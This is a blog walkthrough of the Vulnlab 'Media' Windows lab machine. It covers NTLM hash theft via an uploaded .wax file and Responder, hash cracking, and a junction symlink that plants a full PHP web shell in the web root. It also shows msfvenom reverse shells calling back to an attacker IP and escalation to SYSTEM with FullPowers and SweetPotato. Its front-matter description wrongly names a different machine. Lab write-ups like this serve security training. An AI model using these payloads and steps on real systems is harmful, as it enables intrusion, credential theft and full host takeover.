---
title: Media - Vulnlab
date: 2024-08-08 09:42:08
tags: [vulnlab, Medium]
categories: vulnlab
keywords: 'Vulnlab, Medium, Windows'
description: Sendai is an AD machine that focuses on a large quantity of different AD topics. There are a couple ways to exploit different parts of the attack path - to which I'll go over two methods that I was able to perform for both foothold and privilege escalation. I'm guessing that we'll see many similar tactics to the AD boxes that I've completed before.
cover: /images/vulnlab/media-vl/media_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

Media is one of the last Medium machines that I'll cover as a part of the medium machines chains. I still have to do the Linux machines along with Unintended (the only Linux-specific chain) but we'll get to those later. This machine covers NTLM theft along with exploiting symlinks and restoring an IIS accounts vulnerable privileges.

# Enumeration

To start, let's do our usual NMAP scan.

```
└─$ sudo nmap 10.10.115.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 21:54 EDT
Nmap scan report for 10.10.115.42
Host is up (0.11s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds
```

It seems that there's a webserver along with remote interface protocols being SSH and RDP. I doubt that we'll have immediate access to these, so our entry point is probably going to be the webserver itself.

![](/images/vulnlab/media-vl/b.png)

The web application seems to be called "Promotion Studio", or at least that could be the CMS being used on the backend. Wappalyzer did give us a bit of info on this website - specifically that it is an Apache webserver running PHP. Aside from that though, we don't have much.

Scrolling down however, we do have a noticeable result that may be of use to us.

![](/images/vulnlab/media-vl/c.png)

# NTLM Theft via Windows Media Player

There looks to be an upload functionality for the hiring team accepting applicants. The process is a bit different than sending a regular document, as it seems that the upload functionality itself is only accepting files that are compatible with Windows Media Player.

Doing some research into the specific file format, it looks like the file extension that we're looking for are either `.asf`, `.wma`, `.wax`, and a few others.

![](/images/vulnlab/media-vl/d.png)

The interesting part here is that `.wax` is a valid file extension for Windows Media Player, which is also a file extension that is exploitable by NTLM Theft. 

To those who don't know, there are a large variety of files within Windows that are vulnerable to NTLM theft. This specific attack allows us to create a malicious file that will seem like a regular file, however it will instead perform a request to an endpoint that we control.

In Windows whenever an attempt is made to a URI endpoint, the NetNTLM hash of the client account (the user making the request to the endpoint) is exchanged with the server that is hosting the endpoint. NTLM Theft allows us to poison the request that is made, and extract the NetNTLM hash of the user. This hash is effectively encrypted with the user's plaintext password, giving us the opportunity to crack it.

In our case, we can create a `.wax` Windows Media Player file and have it point to our attacker machine. If the `.wax` file is executed by a user on the backend of the machine, it poison the request and direct it to our MITM server that we stand up.

To start, we'll boot up Responder in a separate terminal tab.

```
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
......
[+] Listening for events...
```

Next, we'll generate a few files using Greenwolf's NTLM theft file generation [here](https://github.com/Greenwolf/ntlm_theft). There is an abundance of different file formats you can use, however we'll be using the `.wax` file type in our case.

```
└─$ python3 ntlm_theft.py -g wax -s 10.8.0.173 -f daz
Created: daz/daz.wax (OPEN)
Generation Complete.

└─$ ls -la daz       
total 12
drwxrwxr-x 2 daz daz 4096 Aug  7 22:10 .
drwxrwxr-x 7 daz daz 4096 Aug  7 22:10 ..
-rw-rw-r-- 1 daz daz   54 Aug  7 22:10 daz.wax
```

All that's left now is to transfer this file via the file upload functionality and wait for any NTLM hash exchanges that are captured in Responder.

After about a minute or two of waiting, you should see a successfully captured hash appear.

```
[+] Listening for events...                                                                                                   

[SMB] NTLMv2-SSP Client   : 10.10.115.42
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:6698cf0238d6cc81:A7112EF24883911141FD714144D4B6FB:010100000000000000F00E5716E9DA014E8B[...snip...]0000000000                                          
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
```

We'll crack this using hashcat along with its hash-identifier, which is 5600 for NetNTLM-v2 hashes.

```
└─$ hashcat -a 0 -m 5600 enox_hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
......
310030002e0038002e0030002e003100370033000000000000000000:[...snip...]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
```

As you can see, we were successfully able to crack the hash for the `enox` user and can now use it to enumerate the target machine.

Given that we now have credentials and there isn't any form of LDAP or Kerberos on this machine, let's just test a simple authentication attempt through SSH.

```
└─$ ssh enox@10.10.115.42
enox@10.10.115.42's password:
Microsoft Windows [Version 10.0.20348.1970]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>
```

The first user flag is within the `enox` user's Desktop directory in their home folder.

# Host Reconnaissance

Now that we have shell access as a user on the machine, let's look around a bit. As I said before, there isn't any form of LDAP or Kerberos on this machine, so our privilege escalation should rely and be exploiting completely through the shell that we currently have access to.

```
PS C:\> ls

Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---        10/10/2023   6:32 AM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-r---         10/2/2023  10:26 AM                Users
d-----        10/10/2023   6:41 AM                Windows
d-----         10/2/2023  11:03 AM                xampp
```

The `C:\` drive does not seem to have anything obscenely useful in our case, as the `xampp` server is the webserver that we previously exploited.

The first thing that jumped out to me (since we don't seem to have any exploitable privileges) is the `xampp` webserver directory itself. Generally, files within a `xampp` webserver are hosted within `C:\xampp\htdocs`.

```
PS C:\xampp\htdocs> echo 'test' > test.txt
out-file : Access to the path 'C:\xampp\htdocs\test.txt' is denied.
At line:1 char:1
+ echo 'test' > test.txt
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
```

However as you'll notice, it does not seem as though we have write access to this directory. At this point there wouldn't be any form

Something that also stood out to me after a bit of filesystem enumeration was how the `.wax` files were processed on the backend. In regular cases, this would generally be a user or a group of people from the team. There is however, a script to automate this in `C:\Users\enox\Documents`.

```
PS C:\Users\enox\Documents> cat review.ps1
......
$todofile="C:\\Windows\\Tasks\\Uploads\\todo.txt"
$mediaPlayerPath = "C:\Program Files (x86)\Windows Media Player\wmplayer.exe"


while($True){

    if ((Get-Content -Path $todofile) -eq $null) {
        Write-Host "Todo is empty."
        Sleep 60 # Sleep for 60 seconds before rechecking
    }
```

The interesting part is the `todofile` that is being commit to a variable name. Browsing to this file in `C:\Windows\Tasks\Uploads` looks to have nothing in it, so we can assume that this text file is only populated when the review script is being ran.

However in this directory, you'll notice that there are a few directories alongside the text file. These directories may differ from you, as they seem to be relative to the uploaded file itself.

```
PS C:\Windows\Tasks\uploads> ls

Directory: C:\Windows\Tasks\uploads

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----                                                
d-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4
d-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd
-a----          8/7/2024   7:52 PM             70 todo.txt
```

I did some research into the review script itself to determine if this directory name that is created is based off any properties, and it seems to be static.

```
    # Read the first line of the file
    $firstLine = Get-Content $FilePath -TotalCount 1

    # Extract the values from the first line
    if ($firstLine -match 'Filename: (.+), Random Variable: (.+)') {
        $filename = $Matches[1]
        $randomVariable = $Matches[2]

        # Create a custom object with the extracted values
        $repoValues = [PSCustomObject]@{
            FileName = $filename
            RandomVariable = $randomVariable
        }
```

The "randomVariable" variable seems to be static as far as I'm concerned, as there are no hashing algorithms that are used in the above code snippet. With this in mind, I decided to try and upload the same file twice through the web application.

```

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4
d-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd
-a----          8/7/2024   7:53 PM              0 todo.txt

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4
d-----          8/7/2024   8:26 PM                ca7a9f126960f1046ff6e022339b54bd
-a----          8/7/2024   8:26 PM             70 todo.txt

PS C:\Windows\Tasks\Uploads> cat todo.txt
Filename: daz.aspx, Random Variable: ca7a9f126960f1046ff6e022339b54bd
```

As you can see, it seems as though the directory that is created is a random variable, however it is static dependent on the name of the file itself. Furthermore, the `todo.txt` file is populated during the file upload process and further cements the name of the directory.

# Exploiting Arbitrary Write Privileges via Symlinks

With that being said, there is an interesting exploit that we can perform. This involves creating a symlink, which is one of the more common ways that a lot of hackers exploit privilege escalation on Windows and Linux machines.

A symlink is essentially a link between two objects on a filesystem. This can be files, directories, users, however generally when we refer to symlinks on filesystems we are noting the link of directories. This is similar to how mounts work in NFS shares, however this all occurs internally on the machine itself.

Creating a symlink for a directory is relatively easy and involves utilizing the `mklink` command. We'll specify the name of a directory that we want to establish the link on, and then the target directory we want it to be linked to. This will essentially function like a mount - meaning that all files that are created within the first directory will be automatically uploaded to the second directory at the endpoint of the symlink and vice versa. You can find more information about symlinks [here](https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/).

Since we know that the file specifically creates a static name for the directory, we can use this to create a symlink between objects (directories in our case) that are created with the specific name and link it to another directory. We can essentially send this anywhere, however in our case let's try to specifically deliver it to the `C:\xampp\htdocs` directory that we previously did not have access to.

Let's first create a simple web shell and upload it via the web application upload functionality. You can find the webshell that I used below from [revshells.com](https://www.revshells.com/).

```PHP
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

After this file is uploaded to the `Uploads` directory, let's grab the name of the directory that is created.

```
PS C:\Windows\Tasks\Uploads> cat .\todo.txt
Filename: webshell.php, Random Variable: a5f9e4b2c2e61ae07ffaec35aa299a7d
```

After this, I deleted the folder after it was created, as we have the "random" variable that is created. We can then use `mklink` to create a symbolic link between the name of the folder that will be created and the `C:\xampp\htdocs` directory.

```
PS C:\Windows\Tasks\Uploads> cmd /c "mklink /J a5f9e4b2c2e61ae07ffaec35aa299a7d C:\xampp\htdocs"
Junction created for a5f9e4b2c2e61ae07ffaec35aa299a7d <<===>> C:\xampp\htdocs
```

Remember that `mklink` is a CMD-specific command, meaning it will be unrecognized by PowerShell.

Now that the link has been established, we'll reupload the webshell with the same properties as we did previously. After it is uploaded, we'll check `C:\xampp\htdocs` to see if the link worked accordingly.

```
PS C:\Windows\Tasks\Uploads> cd C:\xampp\htdocs
PS C:\xampp\htdocs> ls

Directory: C:\xampp\htdocs

Mode                 LastWriteTime         Length Name           
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
-a----          8/7/2024   8:40 PM            348 webshell.php
```

As you can see, the webshell was uploaded successfully via the symlink! We were able to essentially write a webshell onto a directory that we previously did not have access to.

If we browse to the PHP file path, you'll find that we have access to a command execution page.

![](/images/vulnlab/media-vl/e.png)

It seems that we now have command execution as the `LOCAL SERVICE` account, meaning we can execute a payload to receive a netcat reverse shell as this user. I opted to use the Base64 encoded PowerShell reverse shell from revshells.com.

![](/images/vulnlab/media-vl/f.png)

# Restoring LOCAL SERVICE Privileges


Normally since we now have access to the `LOCAL SERVICE` account, we should theoretically have the `SeImpersonatePrivilege` and `SeAssignPrimaryToken` privileges. This would grant us the ability to perform auth coercion to SYSTEM via a malicious named pipe.

However if you'll notice from your privileges, it does not seem as though we have that specific privilege handy.

```
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

There is an easy fix for this, which involves restoring the default privileges set to the `LOCAL SERVICE` account. We can use [this tool](https://github.com/itm4n/FullPowers.git) created by itm4n, which will essentially perform the restoration for us.

Let's first create a MSFVENOM payload for another reverse shell, as we'll need a new session as the restored `LOCAL SERVICE` account. I've been trying to practice exploiting machines without the use of C2's, so we'll just use regular netcat reverse shells for this.

```
└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9002 > daz.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

We'll then transfer that to a directory on the remote filesystem using CURL onto your preferred directory (I made a directory within `C:\temp`).

We'll then also CURL our compiled `FullPowers.exe` binary onto the host. This should leave us with the below two files.

```
PS C:\temp> ls

Directory: C:\temp

Mode                 LastWriteTime         Length Name                   
----                 -------------         ------ ----
-a----          8/7/2024   9:11 PM           7168 daz.exe
-a----          8/7/2024   9:12 PM          36864 FullPowers.exe
```

We can then execute `FullPowers` and generate a new session as `LOCAL SERVICE` with our privileges restored with the below command.

```
PS C:\temp> .\FullPowers.exe -c 'C:\temp\daz.exe'
```

![](/images/vulnlab/media-vl/g.png)

As you can see from the above, we now have `SeImpersonatePrivilege` and can exploit the SYSTEM auth coercion. I've explained this in a few other writeups, however I'll give the rundown just for any new readers.

Service accounts, by default, will have he `SeImpersonatePrivilege` token along with  `SeAssignPrimaryTokenPrivilege`. Having `SeImpersonatePrivilege` essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user. Exploiting this is relatively simple, as we can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM.

We can use the Potato family of exploits to perform this evil named pipe and auth coercion exploit. Generally if AV is enabled we'd have to use a specific Potato exploit, however that does not seem to be the case here. I'll use [SweetPotato](https://github.com/CCob/SweetPotato) for our case here.

We'll generate another MSFVENOM reverse shell on port 9003 and start up a netcat listener beforehand.

```
└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 > daz2.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes

└─$ rlwrap nc -lvnp 9003
listening on [any] 9003 ...
```

We'll then bring our compiled SweetPotato binary over to the remote host via CURL and execute it on our most recent `LOCAL SERVICE` session.

```
PS C:\temp> .\SweetPotato.exe -p 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -a 'C:\temp\daz2.exe' -e EfsRpc
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method EfsRpc to launch C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[+] Triggering name pipe access on evil PIPE \\localhost/pipe/64a97836-d71d-4171-86fb-4ee82adf0794/\64a97836-d71d-4171-86fb-4ee82adf0794\64a97836-d71d-4171-86fb-4ee82adf0794
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!
```

If we look at our reverse shell window, we can see that a shell was spawned as SYSTEM.

![](/images/vulnlab/media-vl/h.png)

Now that we have a shell as SYSTEM, this means we can effectively read the root flag in the Administrator's Desktop directory, meaning we have completed this machine!

# Conclusion

This machine in particular was very fun, as the steps to learning symlinks was very helpful and is actually a relatively extensive vulnerability in terms of the actions that you can do. Initially, I had tried to create a symlink onto `C:\Windows\System32\wbem` and hijack a DLL that is loaded when `systeminfo` is called, however it did not see as though that could be done. 

Regardless, this machine was great. Big props goes out to enox for creating it.
# Resources

https://support.microsoft.com/en-us/topic/file-types-supported-by-windows-media-player-32d9998e-dc8f-af54-7ba1-e996f74375d9
https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
https://github.com/Greenwolf/ntlm_theft
https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/
https://www.revshells.com/
https://github.com/itm4n/FullPowers
https://github.com/CCob/SweetPotato

